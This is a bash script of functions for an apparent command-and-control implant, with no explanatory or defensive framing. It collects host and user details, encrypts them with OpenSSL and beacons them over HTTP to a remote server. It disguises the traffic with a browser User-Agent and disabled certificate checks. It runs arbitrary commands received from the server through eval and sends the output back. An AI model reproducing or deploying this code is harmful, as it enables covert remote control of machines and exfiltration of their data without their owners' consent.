#!/bin/bash

# Encryption functions (using OpenSSL)
encrypt_data() {
    local data="$1"
    echo "$data" | openssl enc -aes-256-cbc -a -salt -pass pass:"$ENCRYPTION_PASSWORD" 2>/dev/null
}

decrypt_data() {
    local encrypted="$1"
    echo "$encrypted" | openssl enc -aes-256-cbc -d -a -pass pass:"$ENCRYPTION_PASSWORD" 2>/dev/null
}

# System information gathering
get_system_info() {
    local session_id="$1"
    
    local hostname=$(hostname)
    local username=$(whoami)
    local os_type="Linux"
    local os_version=$(uname -r)
    
    local json="{"
    if [ -n "$session_id" ]; then
        json="${json}\"session_id\":\"$session_id\","
    fi
    json="${json}\"hostname\":\"$hostname\","
    json="${json}\"username\":\"$username\","
    json="${json}\"os_type\":\"$os_type\","
    json="${json}\"os_version\":\"$os_version\""
    json="${json}}"
    
    echo "$json"
}

# Command execution
execute_command() {
    local command="$1"
    eval "$command" 2>&1
}

# HTTP communication
send_beacon() {
    local session_id="$1"
    
    # Get system info
    local sys_info=$(get_system_info "$session_id")
    
    # Encrypt data
    local encrypted=$(encrypt_data "$sys_info")
    
    # Prepare request
    local payload="{\"data\":\"$encrypted\"}"
    
    # Send beacon
    local response=$(curl -s -k \
        -X POST \
        -H "Authorization: Bearer $AUTH_TOKEN" \
        -H "Content-Type: application/json" \
        -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" \
        -d "$payload" \
        --max-time 30 \
        "$SERVER_URL/api/v1/sync" 2>/dev/null)
    
    echo "$response"
}

submit_results() {
    local session_id="$1"
    local task_id="$2"
    local output="$3"
    
    # Prepare result data
    local result_json="{\"session_id\":\"$session_id\",\"task_id\":\"$task_id\",\"output\":\"$output\"}"
    
    # Encrypt data
    local encrypted=$(encrypt_data "$result_json")
    
    # Prepare request
    local payload="{\"data\":\"$encrypted\"}"
    
    # Submit results
    curl -s -k \
        -X POST \
        -H "Authorization: Bearer $AUTH_TOKEN" \
        -H "Content-Type: application/json" \
        -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" \
        -d "$payload" \
        --max-time 30 \
        "$SERVER_URL/api/v1/results" &>/dev/null
}

# Parse JSON response (simple extraction)
extract_json_value() {
    local json="$1"
    local key="$2"
    echo "$json" | grep -o "\"$key\":\"[^\"]*\"" | cut -d'"' -f4
}